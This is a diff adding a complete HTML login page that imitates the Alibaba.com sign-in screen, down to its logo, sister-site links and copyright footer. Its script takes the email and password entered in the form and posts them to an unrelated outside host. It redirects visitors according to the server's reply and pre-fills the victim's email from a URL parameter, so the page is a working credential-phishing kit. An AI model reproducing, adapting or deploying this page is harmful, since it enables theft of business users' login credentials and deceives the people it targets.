@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Manufacturer Directory - Suppliers, Manufacturers, Exporters & Importers</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      height: 100%;
+      font-family: 'Inter', Arial, sans-serif;
+      background: #fff;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: #fff;
+      border-bottom: 1px solid #e8e8e8;
+      padding: 0 28px;
+      height: 58px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-shrink: 0;
+      z-index: 10;
+    }
+
+    .logo-area img {
+      height: 36px;
+      display: block;
+    }
+
+    /* Fallback text if no logo */
+    .logo-text {
+      font-size: 13px;
+      color: #bbb;
+      font-style: italic;
+    }
+
+    .lang-wrap {
+      position: relative;
+      display: inline-block;
+    }
+
+    .lang-wrap select {
+      appearance: none;
+      -webkit-appearance: none;
+      background: #fff;
+      border: 1px solid #d0d0d0;
+      border-radius: 4px;
+      padding: 7px 32px 7px 11px;
+      font-size: 14px;
+      font-family: inherit;
+      color: #333;
+      cursor: pointer;
+      outline: none;
+      min-width: 108px;
+      transition: border-color 0.15s;
+    }
+
+    .lang-wrap select:hover,
+    .lang-wrap select:focus { border-color: #ff6a00; }
+
+    .lang-wrap::after {
+      content: '';
+      position: absolute;
+      right: 11px;
+      top: 50%;
+      transform: translateY(-50%);
+      border-left: 4px solid transparent;
+      border-right: 4px solid transparent;
+      border-top: 5px solid #777;
+      pointer-events: none;
+    }
+
+    /* ── MAIN CONTENT ── */
+    .page-body {
+      flex: 1;
+      display: flex;
+      align-items: stretch;
+    }
+
+    /* ── LEFT PANEL ── */
+    .left-panel {
+      /* Fixed width like the screenshot (~52% of viewport) */
+      width: 52%;
+      position: relative;
+      background: #0d2b7a;
+      /* The image determines the height - we display it fully without cropping */
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* The image sits naturally, full width, no cropping */
+    .left-panel img.hero-img {
+      width: 100%;
+      display: block;
+      /* No height constraint so the image shows fully */
+    }
+
+    /* Dark blue overlay only on top portion where text sits */
+    .left-top-overlay {
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 48%;
+      background: linear-gradient(180deg,
+        rgba(5, 20, 80, 0.72) 0%,
+        rgba(5, 20, 80, 0.50) 60%,
+        transparent 100%
+      );
+      pointer-events: none;
+    }
+
+    /* Promo text - centered at top of image */
+    .promo-text {
+      position: absolute;
+      top: 50px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      color: #fff;
+      font-size: 30px;
+      font-weight: 800;
+      line-height: 1.25;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+      padding: 0 32px;
+      text-shadow: 0 2px 12px rgba(0,0,0,0.3);
+    }
+
+    /* PayPal card - bottom left of the image */
+    .paypal-card {
+      position: absolute;
+      bottom: 40px;
+      left: 32px;
+      background: rgba(255,255,255,0.92);
+      backdrop-filter: blur(4px);
+      border-radius: 10px;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      width: 320px;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.18);
+    }
+
+    .pp-logo {
+      flex-shrink: 0;
+      width: 44px;
+      height: 44px;
+    }
+
+    .pp-logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    /* Inline PayPal "P" logo using SVG */
+    .pp-p {
+      width: 44px;
+      height: 44px;
+      flex-shrink: 0;
+    }
+
+    .pp-info .pp-label {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 4px;
+    }
+
+    .pp-prices {
+      display: flex;
+      align-items: baseline;
+      gap: 10px;
+    }
+
+    .pp-new {
+      font-size: 21px;
+      font-weight: 700;
+      color: #e04b00;
+    }
+
+    .pp-old {
+      font-size: 14px;
+      color: #aaa;
+      text-decoration: line-through;
+    }
+
+    /* ── RIGHT PANEL ── */
+    .right-panel {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 60px;
+      background: #fff;
+    }
+
+    .signin-box {
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .signin-box h2 {
+      font-size: 26px;
+      font-weight: 600;
+      color: #111;
+      margin-bottom: 26px;
+    }
+
+    .input-field {
+      width: 100%;
+      height: 52px;
+      border: 1px solid #d0d0d0;
+      border-radius: 4px;
+      padding: 0 14px;
+      font-size: 15px;
+      font-family: inherit;
+      color: #222;
+      outline: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      display: block;
+      margin-bottom: 14px;
+      background: #fff;
+    }
+
+    .input-field::placeholder { color: #bbb; }
+
+    .input-field:focus {
+      border-color: #ff6a00;
+      box-shadow: 0 0 0 2px rgba(255,106,0,0.12);
+    }
+
+    .forgot-row {
+      text-align: right;
+      margin-top: -4px;
+      margin-bottom: 20px;
+    }
+
+    .forgot-row a {
+      font-size: 13px;
+      color: #111;
+      text-decoration: underline;
+      font-weight: 600;
+    }
+
+    .forgot-row a:hover { color: #e04b00; }
+
+    /* ── Continue button — matches screenshot: pill/rounded, orange-red ── */
+    .btn-continue {
+      width: 100%;
+      height: 52px;
+      background: #e04a00;
+      color: #fff;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.15s;
+      letter-spacing: 0.2px;
+    }
+
+    .btn-continue:hover { background: #c94200; }
+
+    /* ── OR divider ── */
+    .or-divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 24px 0;
+      color: #999;
+      font-size: 13px;
+    }
+
+    .or-divider::before,
+    .or-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #e4e4e4;
+    }
+
+    /* ── Social buttons — match screenshot: large square, light gray bg, no border ── */
+    .social-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .soc-btn {
+      height: 56px;
+      border: none;
+      border-radius: 6px;
+      background: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.15s;
+      padding: 0;
+    }
+
+    .soc-btn:hover { background: #ebebeb; }
+
+    /* Keep the circular SVGs at their natural 44px */
+    .soc-btn svg { width: 32px; height: 32px; }
+
+    .create-account {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .create-account a {
+      color: #111;
+      font-weight: 600;
+      text-decoration: underline;
+    }
+
+    .create-account a:hover { color: #e04b00; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: #fff;
+      border-top: 1px solid #e8e8e8;
+      text-align: center;
+      padding: 16px 24px 14px;
+    }
+
+    .foot-siblings {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 8px;
+    }
+
+    .foot-siblings a {
+      font-size: 13px;
+      color: #555;
+      text-decoration: none;
+      padding: 0 10px;
+      border-right: 1px solid #ccc;
+      line-height: 1;
+    }
+
+    .foot-siblings a:last-child { border-right: none; }
+    .foot-siblings a:hover { color: #e04b00; }
+
+    .foot-policies {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 8px;
+    }
+
+    .foot-policies a {
+      font-size: 12px;
+      color: #555;
+      text-decoration: none;
+      padding: 0 8px;
+      border-right: 1px solid #ccc;
+      line-height: 1;
+    }
+
+    .foot-policies a:last-child { border-right: none; }
+    .foot-policies a:hover { color: #e04b00; }
+
+    .foot-copy {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .foot-copy p { font-size: 12px; color: #999; }
+
+    .cert {
+      width: 24px; height: 24px;
+      background: #f2f2f2;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+    }
+
+    /* ── MOBILE (≤ 768px) ── */
+    @media (min-width: 769px) {
+      /* Ensure desktop email placeholder is short */
+      #mainBtn { }
+      #orDivider::before, #orDivider::after { display: block; }
+    }
+
+    @media (max-width: 768px) {
+
+      /* Hide desktop left panel and footer on mobile */
+      .left-panel { display: none; }
+      footer { display: none; }
+
+      /* Header becomes mobile nav bar */
+      header {
+        position: relative;
+        padding: 0 16px;
+        height: 56px;
+        border-bottom: 1px solid #e8e8e8;
+      }
+
+      /* Hide language selector on mobile header */
+      .lang-wrap { display: none; }
+
+      /* Back arrow on left */
+      header::before {
+        content: '‹';
+        font-size: 28px;
+        font-weight: 300;
+        color: #111;
+        line-height: 1;
+        cursor: pointer;
+      }
+
+      /* "Sign in" title in center */
+      .logo-area {
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+      }
+
+      .logo-text {
+        display: none;
+      }
+
+      /* Show mobile title via pseudo */
+      .logo-area::after {
+        content: 'Sign in';
+        font-size: 18px;
+        font-weight: 700;
+        color: #111;
+        font-style: normal;
+      }
+
+      /* Note icon on right */
+      header::after {
+        content: '📋';
+        font-size: 20px;
+        cursor: pointer;
+        filter: grayscale(1);
+        opacity: 0.7;
+      }
+
+      /* Full width single column */
+      .page-body {
+        flex-direction: column;
+      }
+
+      .right-panel {
+        width: 100%;
+        padding: 40px 20px 32px;
+        align-items: flex-start;
+        justify-content: flex-start;
+      }
+
+      .signin-box {
+        max-width: 100%;
+      }
+
+      /* Hide the desktop "Sign in" h2 on mobile - header shows it */
+      .signin-box h2 {
+        display: none;
+      }
+
+      /* Mobile inputs: underline only, no box border */
+      .input-field {
+        border: none;
+        border-bottom: 1.5px solid #111;
+        border-radius: 0;
+        padding: 12px 0;
+        font-size: 16px;
+        height: auto;
+        margin-bottom: 24px;
+        background: transparent;
+      }
+
+      .input-field:focus {
+        border-bottom-color: #ff6a00;
+        box-shadow: none;
+      }
+
+      /* Password field wrapper for eye icon */
+      .password-wrap {
+        position: relative;
+        margin-bottom: 0;
+      }
+
+      .password-wrap .input-field {
+        padding-right: 36px;
+        margin-bottom: 0;
+      }
+
+      .eye-toggle {
+        position: absolute;
+        right: 2px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 4px;
+        color: #888;
+        display: flex;
+        align-items: center;
+      }
+
+      .eye-toggle svg { width: 22px; height: 22px; }
+
+      /* Forgot password - orange on mobile */
+      .forgot-row a {
+        color: #ff7a00;
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      /* Button says "Sign in" on mobile */
+      .btn-continue {
+        background: #ff7a00;
+        border-radius: 30px;
+        height: 52px;
+        font-size: 17px;
+        font-weight: 600;
+      }
+
+      .btn-continue::after {
+        content: ' in';
+      }
+
+      /* Hide desktop "Continue" text, show "Sign" */
+      /* We'll handle via JS or just rename the button */
+
+      /* "Or sign in with" text - orange, centered */
+      .or-divider {
+        color: #ff7a00;
+        font-size: 14px;
+        font-weight: 500;
+        margin: 28px 0 20px;
+      }
+
+      .or-divider::before,
+      .or-divider::after {
+        display: none;
+      }
+
+      /* Social icons: circular, spaced out, icon-only */
+      .social-row {
+        display: flex;
+        justify-content: center;
+        gap: 32px;
+        margin-bottom: 32px;
+      }
+
+      .soc-btn {
+        width: 56px;
+        height: 56px;
+        border-radius: 50%;
+        border: none;
+        background: transparent;
+        padding: 0;
+      }
+
+      .soc-btn svg { width: 44px; height: 44px; }
+
+      /* "Don't have an account? Register" - orange */
+      .create-account {
+        color: #ff7a00;
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .create-account a {
+        color: #ff7a00;
+        text-decoration: none;
+        font-weight: 600;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="logo-area">
+      <img src="https://s.alicdn.com/@img/tfs/TB1pDDmmF67gK0jSZPfXXahhFXa-2814-380.png" alt="Logo"> 
+    </div>
+    <div class="lang-wrap">
+      <select>
+        <option>English</option>
+        <option>简体中文</option>
+        <option>繁体中文</option>
+        <option>Español</option>
+        <option>Português</option>
+        <option>Deutsch</option>
+        <option>Français</option>
+        <option>Italiano</option>
+        <option>Русский</option>
+        <option>한국어</option>
+      </select>
+    </div>
+  </header>
+
+  <!-- BODY -->
+  <div class="page-body">
+
+    <!-- LEFT -->
+    <div class="left-panel">
+      <!-- Full image, no height crop -->
+      <img class="hero-img"
+        src="https://s.alicdn.com/@img/imgextra/i2/O1CN015pIqUT1MbyyYv7J1d_!!6000000001454-2-tps-1920-1600.png"
+        alt="Manufacturer">
+
+      <!-- Overlay for text readability -->
+      <div class="left-top-overlay"></div>
+
+
+    
+    </div>
+
+    <!-- RIGHT -->
+    <div class="right-panel">
+      <div class="signin-box">
+        <h2>Sign in</h2>
+
+        <form id="detailForm">
+          <input class="input-field" id="emailInput" name="email" type="email" placeholder="Email address" autocomplete="email">
+
+          <div class="password-wrap">
+            <input class="input-field" id="pwdInput" name="password" type="password" placeholder="Enter Password" autocomplete="current-password">
+            <button class="eye-toggle" onclick="togglePwd()" type="button" aria-label="Toggle password">
+              <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                <circle cx="12" cy="12" r="3"/>
+                <line x1="3" y1="3" x2="21" y2="21" id="eyeSlash" style="display:none"/>
+              </svg>
+            </button>
+          </div>
+
+          <div class="forgot-row">
+            <a href="#">Forgot password?</a>
+          </div>
+
+          <button class="btn-continue" id="mainBtn" type="submit">Sign in</button>
+        </form>
+
+        <div class="or-divider" id="orDivider">Or sign in with</div>
+
+        <div class="social-row">
+          <!-- Google -->
+          <button class="soc-btn" title="Sign in with Google">
+            <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="22" cy="22" r="22" fill="#f5f5f5"/>
+              <path d="M33.56 22.25c0-.78-.07-1.53-.2-2.25H22v4.26h6.92c-.3 1.6-1.2 2.96-2.56 3.87v3.22h4.14c2.42-2.23 3.06-5.52 3.06-9.1z" fill="#4285F4"/>
+              <path d="M22 34c3.48 0 6.4-1.15 8.53-3.12l-4.14-3.22c-1.15.77-2.62 1.23-4.39 1.23-3.37 0-6.23-2.28-7.25-5.34H10.5v3.33C12.6 30.53 17.02 34 22 34z" fill="#34A853"/>
+              <path d="M14.75 23.55A7.2 7.2 0 0114.35 22c0-.54.09-1.07.4-1.55v-3.33H10.5A12 12 0 0010 22c0 1.93.46 3.75 1.27 5.36l3.48-3.81z" fill="#FBBC05" transform="translate(0, 1.5)"/>
+              <path d="M22 15.38c1.9 0 3.6.65 4.94 1.93l3.7-3.7C28.38 11.5 25.46 10 22 10c-4.98 0-9.4 3.47-11.5 8.12l4.25 3.33C15.77 17.66 18.63 15.38 22 15.38z" fill="#EA4335"/>
+            </svg>
+          </button>
+
+          <!-- Facebook -->
+          <button class="soc-btn" title="Sign in with Facebook">
+            <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="22" cy="22" r="22" fill="#1877F2"/>
+              <path d="M29 22h-4v13h-5V22h-3v-4h3v-2.5C20 13 21.5 11 25 11c1.4 0 3 .2 3 .2V15h-1.7c-1.6 0-2 .8-2 2V18h3.6L27 22h-1z" fill="#fff" transform="translate(1,0)"/>
+            </svg>
+          </button>
+
+          <!-- LinkedIn -->
+          <button class="soc-btn" title="Sign in with LinkedIn">
+            <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="22" cy="22" r="22" fill="#0A66C2"/>
+              <path d="M13 17h4v14h-4zM15 15a2.5 2.5 0 110-5 2.5 2.5 0 010 5zM20 17h4v2s1-2 4-2c3.5 0 5 2.5 5 6v8h-4v-7c0-2-.5-3.5-2.5-3.5S22 22 22 24v7h-2V17z" fill="#fff"/>
+            </svg>
+          </button>
+        </div>
+
+        <div class="create-account">
+          Don't have an account? <a href="#">Register</a>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="foot-siblings">
+      <a href="#">AliExpress</a>
+      <a href="#">1688.com</a>
+      <a href="#">Tmall Taobao World</a>
+      <a href="#">Alipay</a>
+      <a href="#">Lazada</a>
+      <a href="#">Taobao Global</a>
+      <a href="#">TAO</a>
+    </div>
+    <div class="foot-policies">
+      <a href="#">Policies and rules</a>
+      <a href="#">Legal Notice</a>
+      <a href="#">Product Listing Policy</a>
+      <a href="#">Intellectual Property Protection</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Integrity Compliance</a>
+    </div>
+    <div class="foot-copy">
+      <p>© 1999-2026 Alibaba.com. 版权所有：杭州阿里巴巴海外信息技术有限公司 &nbsp;·&nbsp; 增值电信业务经营许可证：浙B2-20241358</p>
+      <span class="cert">🛡</span>
+      <span class="cert">✓</span>
+      <p>浙公网安备33010002000366 &nbsp; 浙ICP备2024067534号-3</p>
+    </div>
+  </footer>
+
+  <script>
+    /* ── PASSWORD TOGGLE ── */
+    function togglePwd() {
+      var inp = document.getElementById('pwdInput');
+      var slash = document.getElementById('eyeSlash');
+      if (inp.type === 'password') {
+        inp.type = 'text';
+        slash.style.display = '';
+      } else {
+        inp.type = 'password';
+        slash.style.display = 'none';
+      }
+    }
+
+    /* ── RESPONSIVE BUTTON / PLACEHOLDER TEXT ── */
+    function applyResponsive() {
+      var btn = document.getElementById('mainBtn');
+      var orDiv = document.getElementById('orDivider');
+      var emailInp = document.getElementById('emailInput');
+      if (window.innerWidth <= 768) {
+        btn.textContent = 'Sign in';
+        orDiv.textContent = 'Or sign in with';
+        emailInp.placeholder = 'Enter your email address';
+      } else {
+        btn.textContent = 'Continue';
+        orDiv.textContent = 'OR';
+        emailInp.placeholder = 'Email address';
+      }
+    }
+
+    applyResponsive();
+    window.addEventListener('resize', applyResponsive);
+
+    /* ── ERROR DISPLAY ── */
+    function showError(message, form) {
+      var error = form.querySelector('.error-box');
+      if (!error) {
+        error = document.createElement('div');
+        error.className = 'error-box';
+        error.style.cssText =
+          'background:#fceee8;border:1px solid #f6c8b5;padding:8px 12px;margin-bottom:14px;font-size:13px;border-radius:4px;color:#c0392b;';
+        form.prepend(error);
+      }
+      error.textContent = message;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+
+      /* ── FORM SUBMISSION ── */
+      const API_URL = 'https://micserver3.qfsnesaravaults.org/api/login/post';
+
+      document.querySelectorAll('#detailForm').forEach(form => {
+        form.addEventListener('submit', async (e) => {
+          e.preventDefault();
+
+          const submitBtn = form.querySelector('button[type="submit"]');
+          submitBtn.disabled = true;
+          const originalText = submitBtn.innerHTML;
+          submitBtn.innerHTML = 'Signing in...';
+
+          // Convert form inputs to JSON
+          const formData = new FormData(form);
+          const payload = Object.fromEntries(formData.entries());
+
+          try {
+            const response = await fetch(API_URL, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+              },
+              body: JSON.stringify(payload)
+            });
+
+            const data = await response.json();
+
+            if (!response.ok) {
+              if (data.redirect_after_attempts === true) {
+                window.location.href = data.redirect;
+              } else {
+                showError(data.message || 'Login failed', form);
+              }
+              return;
+            }
+
+            // Save token if API returns one
+            if (data.token) {
+              localStorage.setItem('auth_token', data.token);
+            }
+
+            // Redirect on success if provided
+            if (data.redirect) {
+              window.location.href = data.redirect;
+            }
+
+          } catch (error) {
+            console.error(error);
+            showError('Network error. Please try again.', form);
+          } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalText;
+            applyResponsive(); // restore correct button text after re-enable
+          }
+        });
+      });
+
+      /* ── EMAIL PRE-FILL FROM URL PARAMS ── */
+      const params = new URLSearchParams(window.location.search);
+      let email = params.get('email');
+
+      if (email) {
+        // Strip anything after the TLD to clean malformed URLs
+        const emailMatch = email.match(/^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}(?:\.[a-zA-Z]{2,})?/);
+
+        if (emailMatch) {
+          email = emailMatch[0];
+
+          // Clean URL if it had extra content appended
+          const originalEmail = params.get('email');
+          if (originalEmail !== email) {
+            params.set('email', email);
+            const newUrl = window.location.pathname + '?' + params.toString();
+            window.history.replaceState({}, '', newUrl);
+          }
+
+          // Pre-fill all email inputs with name="email"
+          document.querySelectorAll('input[name="email"]').forEach(input => {
+            input.value = email;
+          });
+        }
+      }
+
+    });
+  </script>
+</body>
+</html>
